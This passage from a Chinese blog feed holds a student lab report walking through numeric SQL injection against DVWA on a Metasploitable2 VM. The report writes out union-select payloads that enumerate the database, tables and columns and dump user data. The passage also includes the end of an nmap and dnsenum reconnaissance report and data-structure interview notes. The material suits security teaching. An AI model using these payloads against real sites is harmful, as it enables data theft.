DAV&#x2F;2]：服务器操作系统是Ubuntu Linux，HTTP服务是Apache 2.2.8，并支持WebDAV（DAV&#x2F;2是指支持WebDAV协议版本2)。</li><li>IP[192.168.160.136]：显示目标主机的IP地址为 192.168.160.136。</li><li>PHP[5.2.4-2ubuntu5.10]：服务器上安装的PHP版本是5.2.4-2ubuntu5.10。</li><li>Title[Metasploitable2 - Linux]：网页标题显示为Metasploitable2 - Linux，这表明目标主机可能正在运行Metasploitable2，这是一个用于安全测试的演示Linux虚拟机。</li><li>WebDAV[2]：指示服务器支持的WebDAV协议版本为2。</li><li>X-Powered-By[PHP&#x2F;5.2.4-2ubuntu5.10]：显示网页的动态内容由PHP 5.2.4-2ubuntu5.10提供。</li></ol><h3 id="2-1-4-dnsenum"><a href="#2-1-4-dnsenum" class="headerlink" title="2.1.4 dnsenum"></a>2.1.4 dnsenum</h3><p>图2.5所示，是使用<code>dnsenum</code>命令查询之后的结果，但是由于目标靶机没有其他任何域名，所以没有查询到任何的结果。</p><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_4_EXj63ZGDrl.png"></p><center>图2.5  使用dnsenum命令查询结果</center><p>所以再补充查询一个百度网址的域名，查询结果如图2.6所示。</p><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_5_DiNeVVmUpY.png"></p><center>图2.6  使用dnsenum命令查询结果</center><h2 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h2><p>Nmap（Network Mapper）是一个开源的网络探测和安全审核工具，广泛用于网络发现和安全评估。Nmap可以快速扫描网络，发现网络上的主机和服务。通过不同的扫描技术，如TCP SYN扫描、TCP Connect扫描、UDP扫描等，可以确定主机的在线状态和开放的端口。</p><p>Nmap能够检测主机上运行的服务和开放的端口。它可以识别出每个端口上运行的具体服务（如SSH、HTTP、FTP等），并给出相应的版本信息。同时Nmap可以与其他漏洞扫描工具集成，用于扫描已知漏洞和弱点。通过识别服务和操作系统的版本信息，可以帮助安全团队找出潜在的安全问题并采取相应的措施。</p><p>Nmap作为一款强大的网络探测和安全评估工具，被广泛应用于网络管理员、安全专家和渗透测试人员的工作中，帮助他们理解网络拓扑、评估安全风险并制定有效的安全策略。</p><h3 id="2-2-1-主机发现"><a href="#2-2-1-主机发现" class="headerlink" title="2.2.1 主机发现"></a>2.2.1 主机发现</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_6_5cIXWcjlyT.png"></p><center>图2.7  使用dnsenum命令查询结果</center><p>整个扫描过程中，对255个IP地址进行了扫描，发现有4个主机是活跃的，扫描总共花费了2.69秒。</p><p>这种类型的扫描对于快速确定一个网段中哪些主机是活跃的很有用，但它并没有深入探测主机上的具体服务和端口。</p><h3 id="2-2-2-TCP端口扫描"><a href="#2-2-2-TCP端口扫描" class="headerlink" title="2.2.2 TCP端口扫描"></a>2.2.2 TCP端口扫描</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_7_q3BYDQ29WX.png"></p><center>图2.8  使用nmap -sS命令查询结果</center><p>扫描结果显示了该主机开放的TCP端口及其对应的服务，其中PORT展示了端口号及其协议（这里都是TCP）。STATE：端口的状态，这些端口都是开放（open）的，即主机正在监听这些端口。SERVICE：与每个端口关联的服务的名称。</p><h3 id="2-2-3-版本侦测"><a href="#2-2-3-版本侦测" class="headerlink" title="2.2.3 版本侦测"></a>2.2.3 版本侦测</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_8_nRd-pvVx4Y.png"></p><center>图2.9  TCP版本侦测</center><p>使用-sV参数可以得到目标主机更详细的端口使用情况，如图2.9所示显示了详细的服务版本和相关信息。</p><h3 id="2-2-4-操作系统侦测"><a href="#2-2-4-操作系统侦测" class="headerlink" title="2.2.4 操作系统侦测"></a>2.2.4 操作系统侦测</h3><p>使用Nmap工具的 -O 参数进行的操作系统检测（OS detection）的结果，结果如图2.10所示。</p><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_9_EGdOT_4WW_.png"></p><center>图2.10  操作系统侦测</center><ol><li>MAC地址：00:0C:29:21:04:06，指示设备是一个VMware虚拟机的网络适配器的MAC地址。</li><li>Device type：设备类型：general purpose，表示这是一个通用用途的设备，没有特定的专用设备类型。</li><li>Running：运行的操作系统：Linux 2.6.X，这表示该设备正在运行Linux内核版本为2.6的操作系统。</li><li>OS CPE：操作系统的CPE标识符：cpe:&#x2F;o:linux:linux_kernel:2.6，这是指对应的通用平台标识（Common Platform Enumeration），指定了Linux操作系统内核的版本为2.6。</li><li>OS details：操作系统详细信息：Linux 2.6.9 - 2.6.33，这表示Nmap根据其特征匹配和检测，推测该设备运行的Linux操作系统版本范围在2.6.9到2.6.33之间。这是基于Nmap的OS检测引擎根据扫描结果推断出来的信息，而不是直接从设备上获取的精确版本号。</li><li>Network Distance：网络距离：1 hop，表示从扫描源（Nmap运行的主机）到目标设备只有一个网络跳跃。</li></ol><h3 id="2-2-5-防火墙侦测"><a href="#2-2-5-防火墙侦测" class="headerlink" title="2.2.5 防火墙侦测"></a>2.2.5 防火墙侦测</h3><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_10_Y9RQCMSkQ8.png"></p><center>图2.11  防火墙侦测</center><p>在ACK扫描中，Nmap发送TCP ACK包到目标端口，然后根据目标主机的响应（或者缺乏响应）来推断端口的状态。在这种情况下，所有端口都显示为“ignored states”，可能是因为目标主机的防火墙或网络配置对ACK扫描做了特殊处理，使得Nmap无法准确地确定端口的状态。</p><h2 id="2-3-漏洞扫描"><a href="#2-3-漏洞扫描" class="headerlink" title="2.3 漏洞扫描"></a>2.3 漏洞扫描</h2><p>漏洞扫描是一种计算机安全评估技术，用于识别目标系统或网络中存在的安全漏洞和弱点。这些漏洞可能是由于配置错误、未修补的软件缺陷、弱密码、不安全的网络服务或其他安全实践不当而导致的。</p><p>扫描工具会自动或半自动地对目标系统进行检测，以识别可能存在的漏洞和弱点。这些漏洞可以包括已知的软件漏洞、配置错误、缺少安全补丁等。</p><p><img src="/2024/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/image_11_AeX-WobnQt.png"></p><center>图2.12  漏洞扫描</center><p>图2.12展示了目标靶机Web服务的更详细的安全扫描报告，显示了更多的潜在安全风险和建议，这里选择其中一条进行分析。</p><p>在扫描结果中提示发现了一个名为phpinfo.php的测试脚本，其运行了phpinfo()函数。phpinfo()函数会显示PHP配置和系统信息，这可能泄露给攻击者有关服务器配置和版本的详细信息。这种公开信息会增加攻击面，应该限制访问或删除不必要的测试脚本。</p><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><p>通过本次实验可以知道在攻击一个目标主机之前，可以先收集有关的信息，以更多的掌握目标主机的有关信息。同时本次实验中，也可以通过工具来发现目标主机中是否存在潜在的漏洞。</p><p>反之，我们自己在搭建系统或者为他人提供一个web服务时，也可以使用这种方法来检测一下是否存在漏洞，起到预防作用。同时，渗透测试作为一种实验性质的安全评估方法，不仅能够发现系统中的潜在风险，还能为系统管理员提供有价值的安全改进建议，是信息安全管理中不可或缺的重要环节。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验6：SQL注入（数字注入）</title>
      <link href="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li><li>Kali虚拟机版本：6.6.9-amd64</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><h2 id="2-1-判断注入点与注入类型"><a href="#2-1-判断注入点与注入类型" class="headerlink" title="2.1 判断注入点与注入类型"></a>2.1 <strong>判断注入点与注入类型</strong></h2><p>（1）分别测试输入：1、1”和1’。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_iNJl-bbt6N.png"></p><center>图2.1  判断注入类型：输入1</center><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_1_GLdAzPGj_4.png"></p><center>图2.2  判断注入类型：输入1”</center><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_2_Xi57bk6Ffp.png"></p><center>图2.3  判断注入类型：输入1’</center><p>由图2.1所示，从url可知，页面采用GET方法提交数据。由图2.2和图2.3可知，输入１”和1’后不能正确得到查询结果，所以推测注入类型为数字型注入，同时输入的单引号和双引号均被转义，可以推测数据库为MySQL。</p><p>（2）测试输入：2 and 2 &#x3D; 2和2 or 2 &#x3D; 2</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_3_2lKmw2hSgv.png"></p><center>图2.4  判断注入类型：输入2 and 2 = 2</center><p>由图2.4可知，当输入“2 and 2 &#x3D; 2”时，其中后面的and条件始终成立，所以查询的条件还是前面的1起作用，所以查询的结果即为查询id是1的信息。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_4_Cc0lARlWpv.png"></p><center>图2.5  判断注入类型：输入2 or 2 = 2</center><p>图2.5可以通过使用or条件判断来使得整个where判断为true，所以会显示所有用户的信息。</p><h2 id="2-2-获取SQL语句中的字段数"><a href="#2-2-获取SQL语句中的字段数" class="headerlink" title="2.2 获取SQL语句中的字段数"></a>2.2 <strong>获取SQL语句中的字段数</strong></h2><p>使用order by来判断SQL语句中由多少个字段，</p><p>（1）输入：１ order by 1#</p><p>order by 1表示按照第一个列进行排序。在SQL中，`order by`子句用于指定查询结果的排序方式，后面可以跟列名或者列的位置（从1开始计数）。因此，`order by 1`表示按照第一个列（查询结果中的第一个列）进行升序排序。`#`符号是SQL中的注释符号，表示后面的内容将被忽略。因此，整个SQL语句的含义是选择数据并按照第一个列进行排序。</p><p>结果如图2.6所示，可以看成执行查询成功，所以SQL语句中字段数大于等于１。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_5_IuYLGb8Yyw.png"></p><center>图2.6  判断字段数：输入1 order by 1#</center><p>（2）输入：3 order by 2#</p><p>结果如图2.7所示，可以看成执行查询成功，所以SQL语句中字段数大于等于2。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_6_phuPxaoUOb.png"></p><center>图2.7  判断字段数：输入3 order by 2#</center><p>（3）输入：4 order by 3#</p><p>结果如图2.8所示，查询失败，所以可以确定SQL语句中查询字段数为2。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_7_l52qnrcgGK.png"></p><center>图2.8  判断注入类型：输入4 order by 3#</center><h2 id="2-3-判断回显位置"><a href="#2-3-判断回显位置" class="headerlink" title="2.3 判断回显位置"></a>2.3 <strong>判断回显位置</strong></h2><p>判断回显位置用来判断目标信息的输出位置，使用union关键字进行分析。输入：6 union select 123, 456#</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_8_IDRJuHKKnN.png"></p><center>图2.9  判断回显位置</center><p>如图2.9所示，查询结果的显示位置是在First name和Surname字段之后。</p><h2 id="2-4-获取数据库信息"><a href="#2-4-获取数据库信息" class="headerlink" title="2.4 获取数据库信息"></a>2.4 <strong>获取数据库信息</strong></h2><p>输入：7 union select 24,database()#，如图2.10所示，可以得到数据库名为“dvwa”。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_9_n4GHURcNv_.png"></p><center>图2.10  获取数据库信息</center><h2 id="2-5-获取数据库中表名"><a href="#2-5-获取数据库中表名" class="headerlink" title="2.5 获取数据库中表名"></a>2.5 <strong>获取数据库中表名</strong></h2><p>输入：8 union select 25, table_name from information_schema.tables where table_schema&#x3D;database()#。如图2.11所示，可以得到数据库dvwa中有2个表，分别为guestbook和users。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_10_SOPmB2a2R4.png"></p><center>图2.11  获取数据库中的表名</center><h2 id="2-6-获取数据库中表中字段名"><a href="#2-6-获取数据库中表中字段名" class="headerlink" title="2.6 获取数据库中表中字段名"></a>2.6 <strong>获取数据库中表中字段名</strong></h2><p>这里查询users表中的列名，在构造SQL语句的过程中需要注意，因为是数字型注入，我们不能直接输入table_name&#x3D;users，需要将users转换为对应的ASCII码，构造的SQL语句如下：5 union select 26, column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273#，如图2.12所示。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_11_hKz2GSqh2N.png"></p><center>图2.12  获取users表中的字段名</center><p>可以得到users表中一共有user_id、first_name、last_name、user、password和avatar6个列。</p><h2 id="2-7-获取字段中的值"><a href="#2-7-获取字段中的值" class="headerlink" title="2.7 获取字段中的值"></a>2.7 <strong>获取字段中的值</strong></h2><p>获取users表中的user_id和avatar字段数据为例，输入：4 union select user_id, avatar from users#，如图2.13所示，查询得到了所有的用户id以及对应的头像。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_12_eS9tPFkrG1.png"></p><center>图2.13  获取users表中的user\_id和avatar字段</center><h2 id="2-8-通过SQL注入获取guestbook表中的字段"><a href="#2-8-通过SQL注入获取guestbook表中的字段" class="headerlink" title="2.8 通过SQL注入获取guestbook表中的字段"></a>2.8 <strong>通过SQL注入获取guestbook表中的字段</strong></h2><p>要获取guestbook表中的字段值，可以使用类似上述的查询语句，输入：<code>3 union select 6666, column\_name from information\_schema.columns where table\_schema=database() and table\_name=0x6775657374626f6f6b#</code>，查询结果如图2.14所示。</p><p><img src="/2024/08/05/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%95%B0%E5%AD%97%E6%B3%A8%E5%85%A5%EF%BC%89/image_13_724eSkatFQ.png"></p><center>图2.14  获取guestbook表中的字段名</center><p>可以看到guestbook表中的信息有comment_id、comment和name，之后也可以查询一些guestbook表中的其他信息，过程与上面查询users表类似，不再赘述。</p><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><ol><li>从这个实验可以发现，我们在开发自己的系统过程中，如果我们不对SQL注入进行防护，那么攻击者可以掌握数据库中的所有信息，包括一些用户的个人隐私。所以，以后在开发系统或网站时使用的数据库，一定要防护SQL注入攻击。</li><li>从这次实验可以得到SQL注入攻击的一般流程：<ul><li><strong>判断注入类型，数字型还是字符型</strong>：在注入攻击中，攻击者通常会尝试输入不同类型的数据来判断目标系统对输入数据的处理方式。可以通过尝试输入数字和字符来判断。</li><li><strong>猜解SQL查询语句中的字段数</strong>：攻击者可以通过构造不同的SQL查询语句来尝试猜解查询语句中的字段数，从而更好地构造攻击。</li><li><strong>确定字段的回显位置</strong>：在SQL注入攻击中，攻击者通常会通过观察系统的响应来确定注入的语句是否成功执行，以及注入点是否位于目标字段中。</li><li><strong>获取当前数据库</strong>：通过SQL注入攻击，攻击者可以构造查询语句来获取当前数据库的信息，例如MySQL中的SELECT DATABASE()。</li><li><strong>获取数据库中的表</strong>：通过类似SHOW TABLES或者查询系统表来获取数据库中的表信息。</li><li><strong>获取表中的字段名</strong>：通过查询数据库的系统表或者信息模式，攻击者可以获取表中的字段名信息，例如SHOW COLUMNS FROM table_name或者查询系统表INFORMATION_SCHEMA.COLUMNS。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构面经3：栈、队列和串</title>
      <link href="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/"/>
      <url>/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_tLUWwXMRo_.png"></p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_2omSaK-_bN.png"></p><h1 id="1-栈和队列的区别和存储结构"><a href="#1-栈和队列的区别和存储结构" class="headerlink" title="1 栈和队列的区别和存储结构"></a>1 栈和队列的区别和存储结构</h1><h2 id="1-1-栈"><a href="#1-1-栈" class="headerlink" title="1.1 栈"></a>1.1 栈</h2><p><strong>定义</strong>：只允许在表尾（栈顶）进行插入和删除的线性表，“先进后出”</p><p><strong>顺序栈</strong>：数组（存放栈中元素）、栈顶指针</p><p><strong>链栈</strong>：栈顶是一个指针</p><h2 id="1-2-队列"><a href="#1-2-队列" class="headerlink" title="1.2 队列"></a>1.2 队列</h2><p><strong>定义</strong>：只允许在表的一端（队尾）插入，在另一端（队首）删除的线性表，“先进先出”</p><p><strong>顺序队列</strong>：数组（存放队列中元素）、头指针、尾指针</p><p><strong>链式队列</strong>：队首指针、队尾指针</p><ul><li>两个栈模拟一个队列：队列是先进先出，栈的是先进后出。同一组数据连续执行两次先进后出之后再出栈就可以实现队列的先进先出。</li></ul><hr><h1 id="2-共享栈"><a href="#2-共享栈" class="headerlink" title="2 共享栈"></a>2 共享栈</h1><p>利用栈底位置相对不变的特性，<strong>让两个顺序栈共享一个一维数组空间</strong>，将两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸。这样能够更有效的利用存储空间，防止上溢。</p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_43Z-z2Xe-a.png"></p><hr><h1 id="3-如何区分循环队列是队空还是队满？"><a href="#3-如何区分循环队列是队空还是队满？" class="headerlink" title="3 如何区分循环队列是队空还是队满？"></a>3 如何区分循环队列是队空还是队满？</h1><p>一般情况，队空和队满的判断条件都是<code>Q.front == Q.rear</code>，可以使用以下2种方法来进行区分：</p><p>（1）方法1：牺牲一个单元（即最后一个单元不存数据）来区分队空和队满</p><ul><li>队空：<code>Q.front == Q.rear</code></li><li>队满：<code>(Q.rear + 1) % MaxSize == Q.front</code></li><li>元素个数：<code>(Q.rear - Q.front + MaxSize) % MaxSize</code></li></ul><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_WiWEqa92Z6.png"></p><p>（2）方法2：队列结构体中增加一个<code>Q.size</code>表示元素个数</p><hr><h1 id="4-栈在括号匹配中的算法思想"><a href="#4-栈在括号匹配中的算法思想" class="headerlink" title="4 栈在括号匹配中的算法思想"></a>4 栈在括号匹配中的算法思想</h1><p>设置一个空栈，顺序读入括号：</p><ul><li>若是左括号，则进栈</li><li>若是右括号<ul><li>若栈空，则匹配失败，右括号多余</li><li>否则，弹出一个栈顶的左括号</li></ul></li></ul><p>读完所有括号后：</p><ul><li>若栈空，则表达式中括号匹配正确</li><li>否则，匹配失败，左括号多余</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_brackets</span><span class="params">(string tokens)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; stk;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tokens.<span class="built_in">size</span>(); i ++)</span><br><span class="line">        <span class="keyword">if</span> (tokens[i] == <span class="string">&#x27;(&#x27;</span>) stk.<span class="built_in">push</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i] == <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stk.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">else</span> stk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="5-栈在后缀表达式求值中的算法思想"><a href="#5-栈在后缀表达式求值中的算法思想" class="headerlink" title="5 栈在后缀表达式求值中的算法思想"></a>5 栈在后缀表达式求值中的算法思想</h1><ul><li>创建一个空栈，顺序扫描表达式的每一项<ul><li>若该项是操作数，则将其压栈</li><li>若该项是操作符&lt;op&gt;，则连续从栈中pop出两个操作数Y和X，形成运算指令X&lt;op&gt;Y，并将计算结果重新压栈</li></ul></li><li>当表达式的所有项都扫描完后，栈顶存放的就是最后的计算结果</li></ul><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_606c1OmbT0.png"></p><hr><h1 id="6-栈在递归中的应用？"><a href="#6-栈在递归中的应用？" class="headerlink" title="6 栈在递归中的应用？"></a>6 栈在递归中的应用？</h1><p>递归是一种重要的程序设计方法。简单地说，若在一个函数、过程或数据结构的定义中又应用了它自身，则这个函数、过程或数据结构称为是递归定义的，简称<strong>递归</strong>。</p><p>它通常把一个大型的复杂问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的代码就可以描述出解题过程所需要的多次重复计算，大大减少了程序的代码量。</p><p>但在通常情况下，它的效率并不是太高。将递归算法转换为非递归算法，通常需要借助栈来实现这种转换。</p><hr><h1 id="7-队列在层次遍历中的作用？"><a href="#7-队列在层次遍历中的作用？" class="headerlink" title="7 队列在层次遍历中的作用？"></a>7 队列在层次遍历中的作用？</h1><p>在信息处理中有一大类问题需要逐层或逐行处理。这类问题的解决方法往往是在处理当前层或当前行时就对下一层或下一行做预处理，把处理顺序安排好，待当前层或当前行处理完毕，就可以处理下一层或下一行。使用队列是为了保存下一步的处理顺序。下面用二叉树层次遍历的例子，说明队列的应用。</p><p><img src="/2024/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F3%EF%BC%9A%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%B2/image_5FpcYNEa9P.png"></p><hr><h1 id="8-队列在计算机系统中的应用？"><a href="#8-队列在计算机系统中的应用？" class="headerlink" title="8 队列在计算机系统中的应用？"></a>8 队列在计算机系统中的应用？</h1><p>队列在计算机系统中的应用非常广泛，以下仅从两个方面来简述队列在计算机系统中的作用：</p><ol><li>解决主机与外部设备之间速度不匹配的问题</li><li>解决由多用户引起的资源竞争问题</li></ol><p>对于第一个方面，仅以主机和打印机之间速度不匹配的问题为例做简要说明。主机输出数据给打印机打印，输出数据的速度比打印数据的速度要快得多，由于速度不匹配，若直接把输出的数据送给打印机打印显然是不行的。解决的方法是设置一个打印数据缓冲区，主机把要打印输出的数据依次写入这个缓冲区，写满后就暂停输出，转去做其他的事情。打印机就从缓冲区中按照先进先出的原则依次取出数据并打印，打印完后再向主机发出请求。主机接到请求后再向缓冲区写入打印数据。这样做既保证了打印数据的正确，又使主机提高了效率。由此可见，打印数据缓冲区中所存储的数据就是一个队列。</p><p>对于第二个方面， CPU (即中央处理器，它包括运算器和控制器）资源的竞争就是一个典型的例子。在一个带有多终端的计算机系统上，有多个用户需要CPU 各自运行自己的程序，它们分别通过各自的终端向操作系统提出占用CPU 的请求。操作系统通常按照每个请求在时间上的先后顺序，把它们排成一个队列，每次把CPU 分配给队首请求的用户使用。当相应的程序运行结束或用完规定的时间间隔后，令其出队，再把CPU 分配给新的队首请求的用户使用。这样既能满足每个用户的请求，又使CPU 能够正常运行。</p><hr><h1 id="9-矩阵的压缩存储"><a href="#9-矩阵的压缩存储" class="headerlink" title="9 矩阵的压缩存储"></a>9 